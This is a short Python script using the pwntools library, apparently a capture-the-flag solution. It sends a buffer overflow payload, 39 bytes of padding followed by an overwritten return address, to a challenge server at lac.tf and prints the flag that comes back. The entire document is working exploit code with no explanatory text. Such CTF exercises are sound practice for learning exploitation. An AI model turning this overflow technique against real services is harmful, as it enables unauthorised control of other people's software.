#!/usr/bin/env python3

from pwn import *
from time import sleep

payload = b"A"*39 + p64(0x5555555551d5)
conn = remote("lac.tf", 31121)

conn.sendline(payload)
sleep(0.5)
flag = conn.recv().decode("utf-8")
print(flag)
conn.close()